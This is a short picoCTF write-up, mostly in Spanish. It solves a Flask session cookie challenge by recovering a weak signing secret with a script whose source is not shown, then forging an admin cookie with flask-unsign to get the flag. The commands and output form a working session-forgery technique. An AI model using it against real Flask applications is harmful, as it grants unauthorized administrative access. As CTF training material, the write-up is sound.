Alright, enough of using my own encryption. Flask session cookies should be plenty secure!
## Solución
Primero creo con nano al archivo solve.py
```
python3 solve.py eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.arNRpg.mu8-5mKJdw-m1B5k_7bUDJlTjes
Secret key: chocolate chip
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arNTjw.ywTNypBgUjSqTtwi-mq6FZWfRkk
```
obtenemos la llave secreta y la usamos en el comando:
```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "chocolate chip"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arNUKA.uREzeTLE27TwPF7LezyijnOzdYk
```
la cual nos da la cookie para ingresar en la pagina y obtener la flag
picoCTF{cO0ki3s_yum_98b76c03}
## Notas Adicionales


## Referencias
